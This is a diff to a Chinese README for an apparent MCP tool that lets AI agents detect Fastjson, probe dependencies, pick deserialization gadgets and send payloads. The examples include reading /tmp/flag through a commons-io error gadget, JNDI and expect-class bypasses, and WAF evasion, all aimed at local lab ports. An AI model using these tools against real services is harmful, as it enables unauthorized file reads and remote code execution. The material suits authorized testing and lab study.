@@ -64,6 +64,229 @@ CEYE_DOMAIN=hpdth2.ceye.io
 
 注意：`target` 应为反序列化 POST 点（如 `/api/fastjson`）；SafeMode 为低置信启发式并与 AutoCloseable 交叉校验；本地 `18068` 为版本矩阵（瘦依赖），`18268` 为 gadget 靶场。
 
+### 工具输入 / 输出示例
+
+MCP 返回已对 Agent **精简**：去掉 `evidence` / `notes` / `raw` / 空字段等噪声；REST/Web 仍是完整结构。入参只需填有用的；默认值不必显式传 `null`。`ok: false` 时带 `error`。
+
+#### `detect_pipeline`
+
+```json
+{ "target": "http://127.0.0.1:18268/api/fastjson" }
+```
+
+```json
+{
+  "ok": true,
+  "effective_target": "http://127.0.0.1:18268/api/fastjson",
+  "summary": "判定为 Fastjson；版本区间 <=1.2.68；存在期望类",
+  "skipped": [],
+  "next_actions": [
+    "poc_run(family=…, expect_bypass=true, target='http://127.0.0.1:18268/api/fastjson')",
+    "deps_probe(target='http://127.0.0.1:18268/api/fastjson')",
+    "poc_catalog",
+    "docs_list"
+  ],
+  "detect": {
+    "is_fastjson": true,
+    "confidence": 0.92,
+    "primary_guess": "fastjson",
+    "autotype_disabled_hint": true,
+    "summary": "判定为 Fastjson"
+  },
+  "version": {
+    "autotype_enabled": false,
+    "version_range": "<=1.2.68",
+    "version_detail": "1.2.48-1.2.68",
+    "summary": "版本区间 <=1.2.68"
+  },
+  "expect": {
+    "has_expect_class": true,
+    "expect_not_map": true,
+    "summary": "存在期望类"
+  },
+  "health": {
+    "fastjson": "1.2.68",
+    "autotype": false,
+    "deps": { "commons_io": true }
+  }
+}
+```
+
+非 Fastjson：无 `version` / `expect`，`skipped` 含 `["version","expect"]`。可选：`include_dns_version`、`headers`、`proxy`、`base_body`。
+
+#### `deps_probe`
+
+```json
+{
+  "target": "http://127.0.0.1:18268/api/fastjson",
+  "categories": ["commons-io", "spring"]
+}
+```
+
+```json
+{
+  "ok": true,
+  "result": {
+    "method": "class",
+    "scanned": 12,
+    "present_count": 2,
+    "absent_count": 10,
+    "summary": "扫描 12 个类，发现 2 个依赖",
+    "present": [
+      {
+        "clazz": "org.apache.commons.io.ByteOrderMark",
+        "description": "commons-io（通用）",
+        "category": "commons-io"
+      }
+    ],
+    "notes": ["校准：已改用 Class MiscCodec"]
+  }
+}
+```
+
+默认 `method=character`（AutoType 关时降级 `class`）；无回显可 `method=dns`。只返回 `present`，不含全量 `results`。
+
+#### `poc_catalog`
+
+```json
+{ "family": "1.2.68" }
+```
+
+```json
+{
+  "ok": true,
+  "gadgets": {
+    "1.2.68": [
+      {
+        "id": "io_read_error",
+        "title": "commons-io 报错读文件/目录",
+        "requires": ["commons-io", "jdk.nashorn.api.scripting.URLReader"],
+        "input_fields": ["url", "read_length", "read_charset", "guess_byte", "bom_bytes"]
+      }
+    ]
+  },
+  "echo_engines": [{ "id": "auto", "title": "auto（按序探测）" }],
+  "waf_techniques": [{ "id": "unicode", "title": "Unicode 编码" }],
+  "expect_bypass_hint": {
+    "1.2.68": "expect_bypass=true → wrap_currency=true"
+  },
+  "script_hint": "复杂逻辑改参用 poc_script；自动化爆破优先 poc_run(…)"
+}
+```
+
+#### `poc_run`
+
+仅生成：
+
+```json
+{
+  "family": "1.2.68",
+  "options": { "gadget": "io_read_error", "url": "file:///tmp/flag" }
+}
+```
+
+```json
+{
+  "ok": true,
+  "family": "1.2.68",
+  "result": {
+    "ok": true,
+    "gadget": "io_read_error",
+    "payload": "{\"abc\":{\"@type\":\"java.lang.AutoCloseable\",…}",
+    "requires": ["commons-io", "jdk.nashorn.api.scripting.URLReader"],
+    "summary": "已生成 … payload（未发送）"
+  }
+}
+```
+
+发送并爆破读：
+
+```json
+{
+  "family": "1.2.68",
+  "send": true,
+  "target": "http://127.0.0.1:18268/api/fastjson",
+  "options": {
+    "gadget": "io_read_error",
+    "url": "file:///tmp/flag",
+    "read_length": 16,
+    "read_charset": "mixed"
+  }
+}
+```
+
+```json
+{
+  "ok": true,
+  "family": "1.2.68",
+  "result": {
+    "ok": true,
+    "gadget": "io_read_error",
+    "sent": true,
+    "status_code": 200,
+    "read_bytes": [70, 76, 65, 71],
+    "read_content": "FLAG",
+    "summary": "已读出 4 字节"
+  }
+}
+```
+
+`1.2.47` + 期望类绕过：`expect_bypass=true`，`options.gadget=jdbc_rowset`，`options.jndi_url=…`。WAF：`waf_techniques: ["unicode"]`。`cve-2026-16723` 始终执行，忽略 `send`。
+
+#### `poc_script`
+
+```json
+{}
+```
+
+```json
+{
+  "ok": true,
+  "scripts": [
+    {
+      "family": "1.2.68",
+      "gadget": "io_read_error",
+      "filename": "1.2.68_io_read_error.py",
+      "title": "commons-io 报错读文件",
+      "summary": "逐字节 BOM 爆破…请改 ERROR_MARKERS / TARGET / FILE_URL"
+    }
+  ],
+  "hint": "传入 family 与 gadget 获取固定原脚本正文…"
+}
+```
+
+```json
+{ "family": "1.2.68", "gadget": "io_read_error" }
+```
+
+→ `script` 为完整 Python 原文（按环境自行改）。
+
+#### `docs_list` / `docs_get`
+
+```json
+{}
+```
+
+```json
+{
+  "ok": true,
+  "docs": [
+    {
+      "slug": "fastjson-detect",
+      "title": "Fastjson 探测分析",
+      "description": "识别 Fastjson、区分其他 JSON 库…",
+      "order": 4
+    }
+  ],
+  "hint": "使用 docs_get(slug=...) 获取正文"
+}
+```
+
+```json
+{ "slug": "fastjson-detect" }
+```
+
+→ `title` + `content`（Markdown 正文）。
 ### 方式一：stdio
 
 ```bash
